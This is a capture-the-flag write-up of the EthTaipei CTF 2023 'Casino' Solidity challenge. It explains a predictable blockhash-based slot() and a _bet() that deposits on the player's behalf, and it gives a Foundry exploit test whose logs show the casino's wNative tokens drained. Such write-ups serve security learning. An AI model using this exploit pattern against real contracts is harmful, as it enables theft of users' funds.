# EthTaipei CTF 2023 - Casino
- Scope  
    - Casino.sol  
    - WNative.sol
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

### Vulnerability Details
1. `slot()` has poor randomness vulnerability and the result can be calculated
2. `_bet()` deposits the token for you if you do not have enough tokens
```diff
-1 function slot() public view returns (uint256) {
        unchecked {
            uint256 answer = uint256(blockhash(block.number - 1)) % 1000;
            uint256[3] memory slots = [(answer / 100) % 10, (answer / 10) % 10, answer % 10];
            if (slots[0] == slots[1] && slots[1] == slots[2]) {
                if (slots[0] == 7) {
                    return 100;
                } else {
                    return 10;
                }
            } else if (slots[0] == slots[1] || slots[1] == slots[2] || slots[0] == slots[2]) {
                return 3;
            } else {
                return 0;
            }
        }
    }

function _bet(address token, uint256 amount) internal {
        require(isAllowed(token), "Token not allowed");
        CasinoToken cToken = CasinoToken(token);
        try cToken.bet(msg.sender, amount) {}
        catch {
            cToken = CasinoToken(_tokenMap[token]);
-2            deposit(token, amount);
            cToken.bet(msg.sender, amount);
        }
    }
```

### Impact/Proof of Concept
1. Manually tested and block.number 4 returns slot of multiplier 3
2. Call `play()` with an amount (uint256(1000e18) / 3 + 1) that will win us 1000e18 wNative tokens, even though we don't have enough tokens deposited, the casino will help us to deposit for the bet
3. Call `withdraw()` and drain the casino's wNative tokens
```diff
function test_Exploit() public {
        // 1. Manually tested and block.number 4 returns slot of multiplier 3
        // 2. Call play() with an amount (uint256(1000e18) / 3 + 1) that will win us 1000e18 wNative tokens
        // 3. Call withdraw() and drain the casino's wNative tokens

        WrappedNative wToken = base.wNative();
        vm.roll(4);
        uint256 slot = casino.slot();
        console.log("slot: ", slot);
        console.log("blockNumber: ", block.number);
        console.log("my beforeWNative: ", wToken.balanceOf(address(this)) / 1e18);
        console.log("casino beforeWNative: ", wToken.balanceOf(address(casino)) / 1e18);

        require(slot > 0, "Slot == 0");
        
        casino.play(wNative, uint256(1000e18) / 3 + 1); // +1 is because 333e18 * 3(slot) = 999e18 wNative tokens only. Hence we need to +1 so we are able to withdraw and burn 1000e18
        casino.withdraw(wNative, 1000e18);
        console.log("my afterWNative: ", wToken.balanceOf(address(this)) / 1e18);
        console.log("casino afterWNative: ", wToken.balanceOf(address(casino)) / 1e18);
        base.solve();
    }
```

Results:
```diff
[PASS] test_Exploit() (gas: 8937393460516843958)
Logs:
  blockNumber:  4
  slot:  3
  my beforeWNative:  0
  casino beforeWNative:  1000
  my afterWNative:  1000
  casino afterWNative:  0
```
